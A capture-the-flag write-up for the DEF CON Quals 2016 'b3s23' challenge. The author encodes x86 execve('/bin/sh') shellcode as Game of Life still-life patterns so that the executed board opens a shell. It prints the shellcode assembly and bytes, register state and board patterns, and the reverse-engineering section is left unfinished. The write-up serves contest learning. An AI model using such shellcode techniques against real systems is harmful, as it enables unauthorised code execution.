# DEFCON Qualifier 2016: b3s23

----------
## Challenge details
| Contest        | Challenge     | Category  | Points | Solves |
|:---------------|:--------------|:----------|-------:|-------:|
| DEF CON CTF Quals 2016 | b3s23 | Coding Challenges |    111 | 34 |

**Description:**

> Please enjoy a Game of Life at b3s23_28f1ea914f8c873d232da030d4dd00e8.quals.shallweplayaga.me:2323
>
> [Download](http://download.quals.shallweplayaga.me/28f1ea914f8c873d232da030d4dd00e8/b3s23)

-------

## Write-up

### Background

From [Wikipedia](https://en.wikipedia.org/wiki/Conway%27s_Game_of_Life) we learn that b3s23 is the standard way of symbolizing Conway's Game of Life, where a cell is born if it has exactly 3 neighbors, survives if it has 2 or 3 living neighbors, or dies if neither is true. 

### Binary Details

```bash
$ file b3s23
ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
```

### Execution
Upon running the binary we receive the following:
```bash
$ docker run -i legitbs/b3s23
Welcome to b3s23.  Enter x,y coordinates.  Enter any other character to run.
```
It is assumed that we need to enter coordinates in the form x,y (e.g. 1,2) followed by any other character in order to set the positions of the initial live cells on the gameboard and iterate the Game of Life. For example, in order to create a a Block, a [still life](https://en.wikipedia.org/wiki/Still_life_(cellular_automaton)), one could enter the following,
```
0,0
0,1
1,0
1,1
a
```
An excerpt of the output would be
```
110000
110000
000000
```
It was observed from the output that the game was iterating 15 times and then the connnection was closed. The output contained a 110x110 gameboard. I verified that if a coordinate less than 0 or greater than 109 was entered the following error would be printed.
```bash
110,0
Illegal Coordinate!
```
While running it locally, a `Segmentation fault (core dumped)` was reported. The initial assumption was that the result of the final iteration from the Game of Life was being executed by the binary somehow.

### Reverse Engineering

(TBD)

### Solution
To solve this challenge I decided to construct an initial Game of Life board such that the final board would contain assembly code that when executed would provide an interactive shell to the client. I decided to use execve system call to get a shell.

I started with the following execve shellcode,
```c
 int execve(const char *path, char *const argv[], char *const envp[]);
```

```assembly
xor    %eax,%eax        ; "\x31\xC0"
push   %eax             ; "\x50"
push   $0x68732f2f      ; "\x68\x2F\x2F\x73\x68"
push   $0x6e69622f      ; "\x68\x2F\x62\x69\x6E"
mov    %esp,%ebx        ; "\x89\xDC"
mov    %dl, 0x0         ; "\xB2\x00" 
push   %eax             ; "\x50"
push   %ebx             ; "\x53"
mov    %esp,%ecx        ; "\x89\xCC"
mov    %al, $0xb        ; "\xB0\x0B"
int    $0x80            ; "\xCD\x80"     
```
This shellcode accomplishes the following,

1. Sets eax to 0 and then pushes the value on the stack to Null-terminate the path
2. Pushes the the path string, "/bin/sh", on the stack
3. Moves the address of the path to ebx
4. Sets edx to 0
5. Pushes eax on the stack again (still 0) in order to Null-terminate the argv array
6. Pushes the address of the path on the stack
7. Moves the adddress of the stack pointer to ecx
8. Moves the system call number for execve into al
9. Invokes the system call

I decided to attempt to encode the shellcode using only still life constructions. This would ensure that the entire construction would remain during the 15 iterations. At 25 bytes, the binary encoding of this shellcode would eventually wrap around the 110 bits of the first line of the game board. Wrapping would complicate the ability to stabilize the still life constructions. Therefore, I decided to try and reduce the size of the shellcode to only 13 bytes. 

By setting a breakpoint at `0xf661e000`, the address of the game board, I would be able to determine the state of the registers prior to executing the shellcode. The result was the following

``` assembly
eax     0x0
ecx     0x0
edx     0x1
ebx     0xf67c7000    ; last coordinate address
esp     0xf6ffb6cc
eip     0xf661e000
```

Since the eax register is already set to 0, I could eliminate the `xor eax,eax` instruction. The next four instructions are all used to get the address null-terminated path "/bin/sh" into `ebx`. The `ebx` register contains the address of the last bit that was set due to sending the program a coordinate. If I could encode the "/bin/sh" on the game board and send the program the coordinates for the first bit of the string, then `ebx` would already contain the address of the path. This would eliminate the need for the four instructions.

The path "/bin/sh" encodes to following binary string

```
00101111 01100010 01101001 01101110 00101111 01110011 01101000 
```
Unfortunately, the first bit is not a 1. Therefore I would need to set the coordinate 1 bit before my string and then increment ebx. I was able to encode "/bin/sh" using the following still life construction.

```
   00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
   00011000000000000000000000000011000110000000011000000000000000000000000000000000000000000000000000000000000000
   00001000000000000000000000000010000010001000010000000000000000000000000000000000000000000000000000000000000000
   00010001011001100101100000000001000100010100000101101100000000000000000000000000000000000000000000000000000000
-->00101111011000100110100101101110001011110111001101101000000000000000000000000000000000000000000000000000000000
   00101000000001000000000110101000001010000000100000000010000000000000000000000000000000000000000000000000000000
   01100100000001100000000000000000011001000001000000000110000000000000000000000000000000000000000000000000000000
   00001100000000000000000000000000000011000001100000000000000000000000000000000000000000000000000000000000000000
   00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

With this construction in place the shellcode was simplified to the following 10 bytes,

```assembly
mov    %dl, 0x0         ; "\xB2\x00" 
push   %eax             ; "\x50"
push   %ebx             ; "\x53"
mov    %esp,%ecx        ; "\x89\xCC"
mov    %al, $0xb        ; "\xB0\x0B"
int    $0x80            ; "\xCD\x80"   
```
This results in the following 80-bit binary pattern,

```
1011 0010 0000 0000 0101 0000 0101 0011 1000 1001 1100 1100 1011 0000 0000 1011 1100 1101 1000 0000
```

Unfortunately, I was unable to find a stable construction for `mov %esp, %ecx`. So I had to replace this instruction with

```assembly
push esp
pop ecx
```

resulting in the following shellcode

```assembly
mov    %dl, 0x0         ; "\xB2\x00" 
push   %eax             ; "\x50"
push   %ebx             ; "\x53"
push esp                ; "\x54"
pop ecx                 ; "\x59"
mov    %al, $0xb        ; "\xB0\x0B"
int    $0x80            ; "\xCD\x80" 
```
